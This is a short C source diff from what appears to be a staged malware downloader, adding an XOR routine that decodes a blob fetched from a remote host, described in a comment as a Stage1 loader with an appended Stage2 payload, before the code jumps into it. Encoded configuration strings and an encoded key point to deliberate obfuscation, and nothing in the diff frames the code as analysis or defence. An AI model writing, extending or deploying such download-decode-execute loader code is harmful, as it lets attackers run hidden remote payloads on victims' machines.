@@ -40,6 +40,8 @@ static const unsigned char encoded_key[] = {ENCODED_KEY};
 static void decode_config_string(char *dest, const unsigned char *encoded,
                                  size_t max_len);
 static void derive_key_from_string(const char *str, uint8_t *key);
+static void xor_data(char *data, size_t len, const uint8_t *key,
+                     size_t key_len);
 static size_t download_stage1_blob(const char *host, const char *port,
                                    const char *path, const uint8_t *key,
                                    void *buffer, size_t capacity);
@@ -79,6 +81,9 @@ void downloader_main(void) {
     munmap(stage_blob, MAX_STAGE_BLOB_SIZE);
     exit(1);
   }
+
+  // Decode the full staged blob (Stage1 loader + appended Stage2 payload).
+  xor_data((char *)stage_blob, downloaded_size, key, 16);
 
   DEBUG_PRINT("Stage0: downloaded %d bytes, jumping to Stage1\n",
               (int)downloaded_size);
@@ -124,6 +129,13 @@ static void derive_key_from_string(const char *str, uint8_t *key) {
     }
   }
   memcpy(key, temp_key, 16);
+}
+
+static void xor_data(char *data, size_t len, const uint8_t *key,
+                     size_t key_len) {
+  for (size_t i = 0; i < len; i++) {
+    data[i] ^= key[i % key_len];
+  }
 }
 
 static size_t download_stage1_blob(const char *host, const char *port,
